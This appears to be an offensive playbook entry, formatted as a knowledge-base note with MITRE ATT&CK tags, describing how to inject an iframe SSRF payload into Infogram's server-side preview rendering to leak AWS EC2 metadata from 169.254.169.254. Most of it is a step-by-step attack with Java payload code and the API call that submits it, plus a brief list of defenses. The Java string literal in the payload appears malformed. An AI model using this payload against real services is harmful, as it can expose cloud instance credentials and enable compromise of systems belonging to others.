---
id: proc-uuid-004
name: Inject-SSRF-Payload-for-AWS-Metadata-Leak
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:20.606Z'
tactics:
  - '[[Discovery]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
tags:
  - ssrf
  - aws-metadata
  - leak
platforms:
  - Web
  - AWS
tools:
  - '[[tools/Infogram-Java-Library]]'
commands: []
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---

# Inject-SSRF-Payload-for-AWS-Metadata-Leak

## Summary

This procedure extends the stored XSS by injecting an iframe SSRF payload targeting AWS metadata endpoint, leaking internal data via server-side preview rendering in the dashboard.

## Description

Infogram's preview generation on AWS EC2 renders unsanitized HTML server-side, allowing iframes to fetch internal URLs like 169.254.169.254. Prerequisites: API access. Outcomes: Metadata exposure in preview images.

## Requirements

1. Configured Infogram API client
2. Knowledge of AWS link-local metadata URL
3. Dashboard access for preview viewing

## Defense

Defensive measures and detection strategies:

- Block internal URL fetches in server-side rendering
- Sanitize HTML to prevent iframes
- Monitor AWS metadata access logs for anomalies

## Objectives

1. Inject iframe to SSRF internal resources
2. Leak sensitive metadata via preview
3. Demonstrate cloud environment compromise

## Instructions

### Step 1: Modify Payload for SSRF

**Context**: Update content to include iframe.

Set parameters:

```java
parameters.put("content", "[{\"type\":\"h1\",\"text\":\"asd>\\\"\' <iframe src=http://169.254.169.254/latest/meta-data/></iframe>\"}]);
// Add other params as before
```

> Iframe loads metadata. Expected: Valid payload.

### Step 2: Create and View Preview

**Context**: Submit and check dashboard preview.

Send POST as in prior procedure, then view in library.

```java
infogram.sendRequest("POST", "infographics", parameters);
```

> Expected: Preview image shows metadata text.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Infogram-Java-Library]]

## Tags

- [[ssrf]]
- [[aws-metadata]]
